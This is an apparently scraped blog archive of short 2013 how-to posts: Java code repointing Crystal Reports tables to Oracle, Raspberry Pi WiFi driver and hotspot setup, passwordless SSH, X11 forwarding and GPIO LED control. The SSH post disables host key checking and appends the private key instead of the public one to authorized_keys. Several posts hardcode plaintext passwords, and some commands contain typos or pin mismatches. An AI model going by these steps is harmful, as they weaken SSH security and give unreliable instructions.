TABLE_NAME_QUALIFIER = &quot;DHDBA.&quot;;</span><br><span class="line">        final String SERVERNAME = &quot;server&quot;;</span><br><span class="line">        final String CONNECTION_STRING = &quot;Use JDBC=b(true);Connection URL=s(jdbc:oracle:thin:@server:1521:sid);&quot;</span><br><span class="line">                + &quot;Database Class Name=s(oracle.jdbc.driver.OracleDriver);Server=s(server);&quot;</span><br><span class="line">                + &quot;User ID=s(dhdba);Password=;Trusted_Connection=b(false);&quot;</span><br><span class="line">                + &quot;JDBC Connection String=s(!oracle.jdbc.driver.OracleDriver!jdbc:oracle:thin:&#123;userid&#125;/&#123;password&#125;@server:1521:sid)&quot;;</span><br><span class="line">        final String JNDI_DATASOURCE_NAME = &quot;testing&quot;;</span><br><span class="line">        final String DATABASE_CLASS_NAME = &quot;oracle.jdbc.driver.OracleDriver&quot;;</span><br><span class="line">        final String DATABASE_DLL = &quot;crdb_jdbc.dll&quot;;</span><br><span class="line">        final String DBURI = &quot;!oracle.jdbc.driver.OracleDriver!jdbc:oracle:thin:&#123;userid&#125;/&#123;password&#125;@server:1521:sid&quot;;</span><br><span class="line">        final String DBUSERNAME = &quot;dhdba&quot;;</span><br><span class="line">        final String DBPASSWORD = &quot;password&quot;;</span><br><span class="line"></span><br><span class="line">        //Obtain collection of tables from this database controller.</span><br><span class="line">        Tables tables = databaseController.getDatabase().getTables();</span><br><span class="line"></span><br><span class="line">        //Set the datasource for all main report tables.</span><br><span class="line">        for (int i = 0; i &lt; tables.size(); i++) &#123;</span><br><span class="line"></span><br><span class="line">            ITable table = tables.getTable(i);</span><br><span class="line"></span><br><span class="line">            //Keep existing name and alias.</span><br><span class="line">            table.setName(table.getName());</span><br><span class="line">            table.setAlias(table.getAlias());</span><br><span class="line"></span><br><span class="line">            //Change properties that are different from the original datasource.</span><br><span class="line">            table.setQualifiedName(TABLE_NAME_QUALIFIER + table.getName());</span><br><span class="line"></span><br><span class="line">            //Change connection information properties.</span><br><span class="line">            IConnectionInfo connectionInfo = table.getConnectionInfo();</span><br><span class="line"></span><br><span class="line">            PropertyBag innerProp = connectionInfo.getAttributes();</span><br><span class="line">            innerProp.clear();</span><br><span class="line"></span><br><span class="line">            //Set new table connection property attributes.</span><br><span class="line">            PropertyBag propertyBag = new PropertyBag();</span><br><span class="line"></span><br><span class="line">            //Overwrite any existing properties with updated values.</span><br><span class="line">            propertyBag.put(&quot;Trusted_Connection&quot;, &quot;b(false)&quot;);</span><br><span class="line">            propertyBag.put(&quot;Server Name&quot;, SERVERNAME);</span><br><span class="line">            propertyBag.put(&quot;Connection String&quot;, CONNECTION_STRING);</span><br><span class="line">            propertyBag.put(&quot;Server Type&quot;, &quot;JDBC (JNDI)&quot;);</span><br><span class="line">            propertyBag.put(&quot;JNDI Datasource Name&quot;, JNDI_DATASOURCE_NAME);</span><br><span class="line">            propertyBag.put(&quot;Database Class Name&quot;, DATABASE_CLASS_NAME);</span><br><span class="line">            propertyBag.put(&quot;Use JDBC&quot;, &quot;true&quot;);</span><br><span class="line">            propertyBag.put(&quot;URI&quot;, DBURI);</span><br><span class="line">            propertyBag.put(&quot;Database DLL&quot;, DATABASE_DLL);</span><br><span class="line"></span><br><span class="line">            connectionInfo.setAttributes(propertyBag);</span><br><span class="line"></span><br><span class="line">            //Set database username and password.</span><br><span class="line">            //NOTE: Even if these the username and password properties don&#x27;t change when switching databases, the</span><br><span class="line">            //database password is *not* saved in the report and must be set at runtime if the database is secured.</span><br><span class="line">            connectionInfo.setUserName(DBUSERNAME);</span><br><span class="line">            connectionInfo.setPassword(DBPASSWORD);</span><br><span class="line">            connectionInfo.setKind(ConnectionInfoKind.SQL);</span><br><span class="line"></span><br><span class="line">            table.setConnectionInfo(connectionInfo);</span><br><span class="line"></span><br><span class="line">            //Update old table in the report with the new table.</span><br><span class="line">            databaseController.setTableLocation(table, tables.getTable(i));</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>参考资料：<br><a target="_blank" rel="noopener" href="http://www.sdn.sap.com/irj/boc/index?rid=/webcontent/uuid/909355da-5b84-2b10-76a4-eed3ccf9e650">http://www.sdn.sap.com/irj/boc/index?rid=/webcontent/uuid/909355da-5b84-2b10-76a4-eed3ccf9e650</a><br><a target="_blank" rel="noopener" href="http://www.sdn.sap.com/irj/boc/index?rid=/webcontent/uuid/c020cd81-5c84-2b10-3585-bff096303cf6">http://www.sdn.sap.com/irj/boc/index?rid=/webcontent/uuid/c020cd81-5c84-2b10-3585-bff096303cf6</a></p>

      
    </div>
    <footer>
      
        
        
      
      <div class="clearfix"></div>
    </footer>
  </div>
</article>




  <article id="post-Linking-Arduino-Uno-to-the-Raspberry-Pi" class="h-entry post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  
  <div class="post-content">
    <header>
      
        <div class="icon"></div>
        <time class="dt-published" datetime="2013-05-31T01:00:56.000Z"><a href="/2013/05/31/Linking-Arduino-Uno-to-the-Raspberry-Pi/">2013-05-31</a></time>
      
      
  
    <h1 class="title"><a href="/2013/05/31/Linking-Arduino-Uno-to-the-Raspberry-Pi/">Linking Arduino Uno to the Raspberry Pi</a></h1>
  

    </header>
    <div class="e-content entry" itemprop="articleBody">
      
        <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install arduino ( It will install openjdk-6-jre, librxtx-java, avr-libc, avrdude etc )&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;  </span><br><span class="line">sudo apt-get install python-pip  </span><br><span class="line">pip install ino  </span><br><span class="line">mkdir blink; cd blink  </span><br><span class="line">ino init -t blink  </span><br><span class="line">ino build   </span><br><span class="line">ino upload (port: &lt;span&gt;default /dev/ttyACM0 for Uno)&lt;/span&gt;  </span><br><span class="line">ino serial  </span><br></pre></td></tr></table></figure>

<h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference:"></a>Reference:</h1><p><a target="_blank" rel="noopener" href="http://www.recantha.co.uk/blog/?p=1103">http://www.recantha.co.uk/blog/?p=1103</a><br><a target="_blank" rel="noopener" href="http://inotool.org/quickstart">http://inotool.org/quickstart</a><br><a target="_blank" rel="noopener" href="http://netduinoplusfun.wordpress.com/2012/06/13/arduino-ide/">http://netduinoplusfun.wordpress.com/2012/06/13/arduino-ide/</a><br><a target="_blank" rel="noopener" href="http://elinux.org/RPi_Serial_Connection">http://elinux.org/RPi_Serial_Connection</a><br><a target="_blank" rel="noopener" href="http://www.suppertime.co.uk/blogmywiki/2012/09/pi-shall-tweet-unto-arduino/">http://www.suppertime.co.uk/blogmywiki/2012/09/pi-shall-tweet-unto-arduino/</a><br><a target="_blank" rel="noopener" href="http://www.satsignal.eu/ntp/Raspberry-Pi-NTP.html">http://www.satsignal.eu/ntp/Raspberry-Pi-NTP.html</a><br><a target="_blank" rel="noopener" href="http://blog.oscarliang.net/raspberry-pi-and-arduino-connected-serial-gpio/">http://blog.oscarliang.net/raspberry-pi-and-arduino-connected-serial-gpio/</a><br><a target="_blank" rel="noopener" href="http://baldwisdom.com/category/raspberry-pi/">http://baldwisdom.com/category/raspberry-pi/</a><br>The linux document Project <a target="_blank" rel="noopener" href="http://www.tldp.org/HOWTO/Text-Terminal-HOWTO-10.html">http://www.tldp.org/HOWTO/Text-Terminal-HOWTO-10.html</a></p>

      
    </div>
    <footer>
      
        
        
      
      <div class="clearfix"></div>
    </footer>
  </div>
</article>




  <article id="post-Oracle-call-store-procedure" class="h-entry post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  
  <div class="post-content">
    <header>
      
        <div class="icon"></div>
        <time class="dt-published" datetime="2013-04-22T14:44:02.000Z"><a href="/2013/04/22/Oracle-call-store-procedure/">2013-04-22</a></time>
      
      
  
    <h1 class="title"><a href="/2013/04/22/Oracle-call-store-procedure/">Oracle call store procedure</a></h1>
  

    </header>
    <div class="e-content entry" itemprop="articleBody">
      
        <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">variable cur refcursor;</span><br><span class="line">execute GET_APP_POOL_CURSOR(:cur, &#x27;SCREEN&#x27;, &#x27;N&#x27;);</span><br><span class="line">print :cur</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">sf.getCurrentSession().doWork(new Work() &#123;</span><br><span class="line"> @Override</span><br><span class="line"> public void execute(Connection conn) throws SQLException &#123;</span><br><span class="line">  final CallableStatement cs = conn.prepareCall(&quot;&#123;call GET_APP_POOL_CURSOR(?, ?, ?)&#125;&quot;);</span><br><span class="line">  cs.registerOutParameter(1, oracle.jdbc.OracleTypes.CURSOR);</span><br><span class="line">  cs.setString(2, &quot;aa&quot;);</span><br><span class="line">  cs.setString(3, &quot;bb&quot;);</span><br><span class="line"></span><br><span class="line">  cs.execute();</span><br><span class="line">  final ResultSet rs = (ResultSet) cs.getObject(1);</span><br><span class="line">  while (rs.next()) &#123;</span><br><span class="line">    final EvaluationAnpAppVW evaluationAnpAppVW = new EvaluationAnpAppVW();</span><br><span class="line">    evaluationAnpAppVW.setAnpPrdSeq(rs.getLong(2));</span><br><span class="line">  &#125;</span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
      
    </div>
    <footer>
      
        
        
      
      <div class="clearfix"></div>
    </footer>
  </div>
</article>




  <article id="post-Install-Mercury-MW150US-WIFI-dongle-on-RPi" class="h-entry post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  
  <div class="post-content">
    <header>
      
        <div class="icon"></div>
        <time class="dt-published" datetime="2013-02-21T01:23:24.000Z"><a href="/2013/02/21/Install-Mercury-MW150US-WIFI-dongle-on-RPi/">2013-02-21</a></time>
      
      
  
    <h1 class="title"><a href="/2013/02/21/Install-Mercury-MW150US-WIFI-dongle-on-RPi/">Install Mercury MW150US WIFI dongle on RPi</a></h1>
  

    </header>
    <div class="e-content entry" itemprop="articleBody">
      
        <p>The wifi dongle cannot be recognized by command lsusb and lsusb, found the chipset of MW150US is rtl8188eu, not rtl8192cu, it is very important.</p>
<p> My RPi kernel is 3.2.27+, it is need to compile module rtl8188eu with RPi source code.</p>
<p> Procedure as below</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"># apt-get install build-essential</span><br><span class="line">#</span><br><span class="line"># cd /usr/src</span><br><span class="line"># wget -O rpi-3.2.27.tar.gz https://github.com/raspberrypi/linux/tarball/rpi-3.2.27</span><br><span class="line"># tar xzf ./rpi-3.2.27.tar.gz</span><br><span class="line"># KVER=`uname -r`</span><br><span class="line"># mv raspberrypi-linux-* linux-$KVER</span><br><span class="line"># cd linux-$KVER/</span><br><span class="line"># sed -i &#x27;s/EXTRAVERSION =.*/EXTRAVERSION = +/&#x27; Makefile</span><br><span class="line"># zcat /proc/config.gz &gt; .config</span><br><span class="line"># wget https://github.com/raspberrypi/firmware/raw/master/extra/Module.symvers</span><br><span class="line"># make oldconfig</span><br><span class="line"># make modules_prepare</span><br><span class="line"># ln -s /usr/src/linux-$KVER /usr/src/linux</span><br><span class="line"># ln -s /usr/src/linux-$KVER /lib/modules/$KVER/source</span><br><span class="line"># ln -s /usr/src/linux-$KVER /lib/modules/$KVER/build</span><br></pre></td></tr></table></figure>
<p>Get rtl8188eu source code from <a target="_blank" rel="noopener" href="http://gutspot.com/wp-content/uploads/2013/01/8188eu_USB_linux.zip">http://gutspot.com/wp-content/uploads/2013/01/8188eu_USB_linux.zip</a><br>unzip the file and go to directory driver<br><code># make &amp;&amp; make install</code></p>
<p>In my case, it’s all. The module rtl8188eu has been load into RPi, MW150US WIFI dongle can be recognized.</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ifconfig -a</span><br><span class="line">iwcofnig</span><br><span class="line">iwlist wlan0 scan</span><br></pre></td></tr></table></figure>

<p>If it does not work, try the following method,</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># lsmod</span><br><span class="line"># rmmod 8192cu</span><br><span class="line"># insmod 8188eu.ko</span><br><span class="line"># modprobe 8188eu</span><br><span class="line"># modinfo 8188eu</span><br><span class="line">for autoload in RPi</span><br><span class="line"># echo &quot;8188eu&quot; &gt;&gt; /etc/modules</span><br><span class="line"># echo &quot;blacklist rtl8192cu&quot; &gt;&gt; /etc/modprobe.d/blacklist.conf (not necessary)</span><br></pre></td></tr></table></figure>

<p><code>sudo nano /etc/network/interfaces</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">auto lo</span><br><span class="line"></span><br><span class="line">iface lo inet loopback</span><br><span class="line">iface eth0 inet dhcp</span><br><span class="line"></span><br><span class="line">auto wlan0</span><br><span class="line">iface wlan0 inet dhcp</span><br><span class="line"># try one of below options</span><br><span class="line">wpa-conf /etc/wpa_supplicant/wpa_supplicant.conf</span><br><span class="line">OR</span><br><span class="line">pre-up wpa_supplicant -Dwext -iwlan0 -c/etc/wpa_supplicant.conf -B</span><br></pre></td></tr></table></figure>

<p><code>sudo nano /etc/wpa_supplicant/wpa_supplicant.conf</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">network=&#123;</span><br><span class="line">ssid=&quot;YOUR-SSID&quot;</span><br><span class="line">scan_ssid=1</span><br><span class="line">proto=RSN</span><br><span class="line">key_mgmt=WPA-PSK</span><br><span class="line">pairwise=CCMP TKIP</span><br><span class="line">group=CCMP TKIP</span><br><span class="line">psk=&quot;WPA-PASSWORD&quot; # wpa_passphrase</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>Join WIFI network by running from command prompt with wpa_cli</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">#wpa_cli</span><br><span class="line">&gt;scan</span><br><span class="line">&gt;scan_results</span><br><span class="line">&gt;add_network</span><br><span class="line">&gt;set_network 0 ssid &quot;Xperia T2 Ultra&quot;</span><br><span class="line">&gt;set_network 0 psk &quot;74125896&quot;</span><br><span class="line">&gt;enable_network 0</span><br></pre></td></tr></table></figure>

<h1 id="For-reference"><a href="#For-reference" class="headerlink" title="For reference"></a>For reference</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">ssid:   your wifi name</span><br><span class="line">scan_ssid:   value of 1 means broadcast and value of 2 means hidden (suggest you enter value of 1)</span><br><span class="line">psk:   your wifi password</span><br><span class="line">proto:   your choice of RSN or WPA. RSN is WP2 and WPA is WPA1. (most config is RSN)</span><br><span class="line">key_mgmt:   your choice of WPA-PSK or WPA-EAP (pre-shared or enterprise respectively)</span><br><span class="line">pairwise:   your choice of CCMP or TKIP ( WPA2 or WPA1 respectively)</span><br><span class="line">auth_alg:   OPEN option is required for WPA and WPA2 (other option, SHARED &amp; LEAP)</span><br></pre></td></tr></table></figure>

<p>Then run</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># /etc/init.d/networking restart</span><br><span class="line">Or</span><br><span class="line"># ifup wlan0</span><br><span class="line"></span><br><span class="line"># dhclient wlan0</span><br></pre></td></tr></table></figure>

<p>script for auto-start wifi connection(Optional) <code>/etc/init.d/wifi-connect</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">#!/bin/sh</span><br><span class="line">#wifi-connect auto-start</span><br><span class="line"></span><br><span class="line">case $1 in</span><br><span class="line">start)</span><br><span class="line">  wpa_supplicant -B -iwlan0 -c/etc/wpa_supplicant/wpa_supplicant.conf -Dwext -s</span><br><span class="line">  wpa_cli -B -p/var/lib/run/wpa_supplicant -s</span><br><span class="line"> ;;</span><br><span class="line">stop)</span><br><span class="line"></span><br><span class="line"> ;;</span><br><span class="line">restart)</span><br><span class="line"></span><br><span class="line"> ;;</span><br><span class="line">*)</span><br><span class="line"> echo &#x27;Usage:wifi-connect start|stop|restart&#x27;</span><br><span class="line"> ;;</span><br><span class="line">esac</span><br><span class="line">exit 0</span><br><span class="line"></span><br><span class="line"># chmod +x /etc/init.d/wifi-connect</span><br><span class="line"># update-rc.d wifi-connect defaults</span><br><span class="line"># update-rc.d -f wifi-connect remove</span><br></pre></td></tr></table></figure>

<h1 id="Install-hostapd"><a href="#Install-hostapd" class="headerlink" title="Install hostapd"></a>Install hostapd</h1><ol>
<li>unzip wpa_supplicant_hostapd-0.8_rtw_20120803.zip<br>go to directory hostapd and compile<br><code>make &amp;&amp; make install</code><br>** should not ** start hostapd by <code>/etc/init.d/hostapd start</code> just run<br><code>/usr/local/bin/hostapd p2p_hostapd.conf -B</code><br>then hostapd started with ssid DIRECT-RT</li>
<li>config IP address<br><code>ifconfig wlan0 192.168.0.1 netmask 255.255.255.0 (the segment should be match with udhcp)</code></li>
<li><code>sudo apt-get udhcpd</code><br>  <code>/etc/init.d/udhcp start</code></li>
</ol>
<p> Open your mobile’s wifi to search ssid “DIRECT-RT” and pair with it using pasword “12345678”, it will obtain the IP adddress dynamically.</p>
<h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference:"></a>Reference:</h1><p> <a target="_blank" rel="noopener" href="http://omer.me/2012/04/setting-up-wireless-networks-under-debian-on-raspberry-pi/">http://omer.me/2012/04/setting-up-wireless-networks-under-debian-on-raspberry-pi/</a><br> <a target="_blank" rel="noopener" href="http://tasksofohm.wordpress.com/hardware/connecting-raspberry-to-a-ew-7811un">http://tasksofohm.wordpress.com/hardware/connecting-raspberry-to-a-ew-7811un</a><br> <a target="_blank" rel="noopener" href="http://www.ctrl-alt-del.cc/2012/05/raspberry-pi-meets-edimax-ew-7811un-wireless-ada.html">http://www.ctrl-alt-del.cc/2012/05/raspberry-pi-meets-edimax-ew-7811un-wireless-ada.html</a><br> <a target="_blank" rel="noopener" href="https://guts.me/2013/01/30/set-up-wifi-router-with-raspberry-pi-2-compile-driver-for-8188eu-and-set-up-hostap/">https://guts.me/2013/01/30/set-up-wifi-router-with-raspberry-pi-2-compile-driver-for-8188eu-and-set-up-hostap/</a><br> <a target="_blank" rel="noopener" href="http://blog.elevendroids.com/2012/12/building-tp-link-tl-wn725n-wifi-usb-adapter-driver-for-raspberry-pi/">http://blog.elevendroids.com/2012/12/building-tp-link-tl-wn725n-wifi-usb-adapter-driver-for-raspberry-pi/</a><br> <a target="_blank" rel="noopener" href="http://jarhead.blog.163.com/blog/static/175217041201317102236535/">http://jarhead.blog.163.com/blog/static/175217041201317102236535/</a><br> <a target="_blank" rel="noopener" href="http://alansun.iteye.com/blog/1150893">http://alansun.iteye.com/blog/1150893</a></p>
<h2 id="hostapd"><a href="#hostapd" class="headerlink" title="hostapd"></a>hostapd</h2><p> <a target="_blank" rel="noopener" href="http://www.raspberrypi.org/phpBB3/viewtopic.php?t=19120">http://www.raspberrypi.org/phpBB3/viewtopic.php?t=19120</a> <a target="_blank" rel="noopener" href="http://elinux.org/RPI-Wireless-Hotspot">http://elinux.org/RPI-Wireless-Hotspot</a></p>
<p> *** New Version for 3.12.22+ ***<br> Just install a script to install rtl8188eu.ko as below,<br> tar -zxvf 8188eu-201xyyzz.tar.gz<br> &lt;–set data code for driver version above</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo install -p -m 644 8188eu.ko /lib/modules/$(uname -r)/kernel/drivers/net/wireless</span><br><span class="line">sudo insmod /lib/modules/$(uname -r)/kernel/drivers/net/wireless/8188eu.ko</span><br><span class="line">sudo depmod -a</span><br></pre></td></tr></table></figure>
<p><a target="_blank" rel="noopener" href="http://www.raspberrypi.org/forums/viewtopic.php?p=462982#p462982">http://www.raspberrypi.org/forums/viewtopic.php?p=462982#p462982</a><br><a target="_blank" rel="noopener" href="http://www.fars-robotics.net/">http://www.fars-robotics.net/</a></p>

      
    </div>
    <footer>
      
        
        
      
      <div class="clearfix"></div>
    </footer>
  </div>
</article>




  <article id="post-SSH-login-without-password" class="h-entry post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  
  <div class="post-content">
    <header>
      
        <div class="icon"></div>
        <time class="dt-published" datetime="2013-02-14T06:05:47.000Z"><a href="/2013/02/14/SSH-login-without-password/">2013-02-14</a></time>
      
      
  
    <h1 class="title"><a href="/2013/02/14/SSH-login-without-password/">SSH login without password</a></h1>
  

    </header>
    <div class="e-content entry" itemprop="articleBody">
      
        <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ssh-keygen -t rsa -b 2048</span><br><span class="line">set passphase for id_rsa</span><br><span class="line">copy id_rsa.pub to remoteIP&#x27;s folder .ssh/</span><br><span class="line">cat id_rsa &gt;&gt; authorized_keys</span><br><span class="line">chmod 640 authorized_keys</span><br></pre></td></tr></table></figure>

<h1 id="Login-with-ssh"><a href="#Login-with-ssh" class="headerlink" title="Login with ssh"></a>Login with ssh</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ssh-agent bash --login -i</span><br><span class="line">ssh-add</span><br><span class="line">ssh felix@remoteIP OR ssh -A felix@remoteIP (agent forwarding) </span><br><span class="line">OR </span><br><span class="line">ssh -o UserKnownHostsFile=/dev/null -o StrictHostKeyChecking=no felix@remoteIP (disable host key checking)</span><br></pre></td></tr></table></figure>


<h1 id="Login-with-putty"><a href="#Login-with-putty" class="headerlink" title="Login with putty"></a>Login with putty</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">run puttygen.exe to convert id_rsa to putty&#x27;s format</span><br><span class="line">run pageant.exe to load private key</span><br><span class="line">plink.exe felix@remoteIP</span><br><span class="line">config as enable X11 forwarding in putty, and save the session as passwordless.</span><br><span class="line">plink.exe -load passwordless</span><br></pre></td></tr></table></figure>

<h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><p>  <a target="_blank" rel="noopener" href="http://linuxcommando.blogspot.hk/2008/10/how-to-disable-ssh-host-key-checking.html">http://linuxcommando.blogspot.hk/2008/10/how-to-disable-ssh-host-key-checking.html</a><br>  <a target="_blank" rel="noopener" href="http://www.cnblogs.com/cheche/archive/2011/01/07/1918825.html">http://www.cnblogs.com/cheche/archive/2011/01/07/1918825.html</a></p>

      
    </div>
    <footer>
      
        
        
      
      <div class="clearfix"></div>
    </footer>
  </div>
</article>




  <article id="post-putty-for-X11-forwarding" class="h-entry post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  
  <div class="post-content">
    <header>
      
        <div class="icon"></div>
        <time class="dt-published" datetime="2013-01-30T06:34:16.000Z"><a href="/2013/01/30/putty-for-X11-forwarding/">2013-01-30</a></time>
      
      
  
    <h1 class="title"><a href="/2013/01/30/putty-for-X11-forwarding/">putty for X11 forwarding</a></h1>
  

    </header>
    <div class="e-content entry" itemprop="articleBody">
      
        <ol>
<li><p>Install Xming &amp;&amp; Xming-fonts</p>
</li>
<li><p><code>sed -i &#39;s/#X11Forwarding no/X11Forwarding yes/g&#39; /etc/ssh/sshd_config</code><br><code>stopsrc -s sshd &amp;&amp; startpsrc -s sshd</code></p>
</li>
<li><p>Run XLaunch.exe or Xming.exe (XLaunch.exe can be used as mutilwindow)</p>
</li>
<li><p>Run putty<br>  <code>Enable X11 forwarding</code><br>  <code>X display location -&gt; localhost:0</code></p>
</li>
<li><p><code>/usr/java6/bin/jconsole</code></p>
</li>
</ol>
<h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference:"></a>Reference:</h1><p><a target="_blank" rel="noopener" href="http://www.cs.nctu.edu.tw/help/xming.html">http://www.cs.nctu.edu.tw/help/xming.html</a><br><a target="_blank" rel="noopener" href="http://www.math.umn.edu/systems_guide/putty_xwin32.html">http://www.math.umn.edu/systems_guide/putty_xwin32.html</a></p>

      
    </div>
    <footer>
      
        
        
      
      <div class="clearfix"></div>
    </footer>
  </div>
</article>




  <article id="post-Light-LED-in-Raspberry-Pi" class="h-entry post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  
  <div class="post-content">
    <header>
      
        <div class="icon"></div>
        <time class="dt-published" datetime="2013-01-12T07:50:44.000Z"><a href="/2013/01/12/Light-LED-in-Raspberry-Pi/">2013-01-12</a></time>
      
      
  
    <h1 class="title"><a href="/2013/01/12/Light-LED-in-Raspberry-Pi/">Light LED in Raspberry Pi</a></h1>
  

    </header>
    <div class="e-content entry" itemprop="articleBody">
      
        <h1 id="Command"><a href="#Command" class="headerlink" title="Command"></a>Command</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">login as root: su - root</span><br><span class="line">connect gpio 17 pin and GND pin</span><br><span class="line">echo 17 &gt; /sys/class/gpio/export</span><br><span class="line">echo out &gt; /sys/class/gpio/direction</span><br><span class="line">echo 1 &gt; /sys/class/gpio/value # LED bright</span><br><span class="line">echo 0 &gt; /sys/class/gpio/value # LED dim</span><br><span class="line">echo 17 &gt; /sys/class/gpio/unexport</span><br></pre></td></tr></table></figure>

<h1 id="WiringPi"><a href="#WiringPi" class="headerlink" title="WiringPi"></a>WiringPi</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">gpio mode 0 out</span><br><span class="line">gpio write 0 1</span><br><span class="line">gpio write 0 0</span><br></pre></td></tr></table></figure>

<h1 id="WiringPi-python"><a href="#WiringPi-python" class="headerlink" title="WiringPi-python"></a>WiringPi-python</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">sudo get-apt install python-dev python-pip</span><br><span class="line">sudo pip install wiringpi</span><br><span class="line">or</span><br><span class="line">sudo esay_install-2.7 wiringpi</span><br><span class="line">blink.py</span><br><span class="line">import wiringpi</span><br><span class="line">io = wiringpi.GPIO(wiringpi.WPI_MODE_SYS)</span><br><span class="line">io.pinMode(17,io.OUTPUT)</span><br><span class="line">io.digitalWrite(18,io.HIGH)  # Turn on light</span><br><span class="line">io.digitalWrite(18,io.LOW)  # Turn off</span><br></pre></td></tr></table></figure>

